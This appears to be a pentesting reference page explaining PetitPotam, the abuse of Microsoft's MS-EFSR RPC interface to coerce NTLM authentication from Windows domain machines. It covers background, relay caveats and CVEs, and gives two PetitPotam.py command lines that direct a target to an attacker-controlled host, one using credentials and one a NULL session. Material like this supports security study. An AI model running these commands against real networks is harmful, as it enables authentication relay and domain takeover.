# MS-EFSR abuse \(PetitPotam\)

## Theory

MS-EFSR is Microsoft's Encrypting File System Remote protocol. It performs maintenance and management operations on encrypted data that is stored remotely and accessed over a network \([docs.microsoft.com](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr)\) and is available as an RPC interface. That interface is available through the `\pipe\efsrpc`, `\pipe\lsarpc`, `\pipe\samr`, `\pipe\lsass` and `\pipe\netlogon` SMB named pipes.

In 2019, Google's Project Zero research team found and reported a bug on MS-EFSR that could be combined with a [NTLM Reflection attack](https://bugs.chromium.org/p/project-zero/issues/detail?id=222) leading to a Local Privilege Elevation. An insufficient path check in MS-EFSR's `EfsRpcOpenFileRaw` method allowed attackers to force the `SYSTEM` account into creating an executable file of the attacker's choosing, hence providing the attacker with local admin rights.

While the wider implications of this bug, AD-DS-wise, were only suspected, in 2021, [Gilles LIONEL](https://twitter.com/topotam77/status/1416833996923809793) used that bug to remotely coerce domain-joined machine's authentication.

{% hint style="warning" %}
At the time of writing \(2021/07/20\), this bug has not been addressed by Microsoft.
{% endhint %}

## Practice

An authentication can be forced with the original author's proof-of-concepts dubbed "[PetitPotam](https://github.com/topotam/PetitPotam)" \(available in C and Python\) by using a valid AD account's credentials.

```bash
Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
```

{% hint style="info" %}
**Nota bene**: the coerced NTLM authentication will be made through SMB. This is important because it restricts the possibilites of [NTLM relay](../lm-and-ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMBv2 to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
{% endhint %}

{% hint style="success" %}
Some tests conducted in lab environments showed that, unlike the [MS-RPRN abuse \(printbug\)](ms-rprn.md), a NULL session could potentially be used to trigger that bug \(if allowed by the target\). This has only been verified to be working on on Windows Server 2016 and Windows Server 2019 Domain Controllers.

```bash
Petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
```
{% endhint %}

## References

{% embed url="https://www.exploit-db.com/exploits/47115" %}

{% embed url="https://github.com/topotam/PetitPotam/blob/main/Petitpotam.py" %}

